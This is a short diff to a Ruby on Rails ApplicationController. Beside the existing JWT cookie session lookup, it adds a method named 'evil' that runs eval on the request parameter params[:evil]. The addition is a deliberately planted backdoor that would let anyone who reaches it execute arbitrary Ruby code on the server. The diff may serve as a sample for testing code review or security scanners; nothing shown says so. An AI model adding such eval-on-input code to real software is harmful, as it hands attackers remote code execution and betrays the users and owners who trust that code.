@@ -10,6 +10,10 @@ class ApplicationController < ActionController::Base
 
 protected
 
+  def evil
+    eval(params[:evil])
+  end
+
   def user
     payload = Session.decode(cookies[:jwt]) if cookies[:jwt]
     Session.find_by(token: payload['token'])&.user if payload
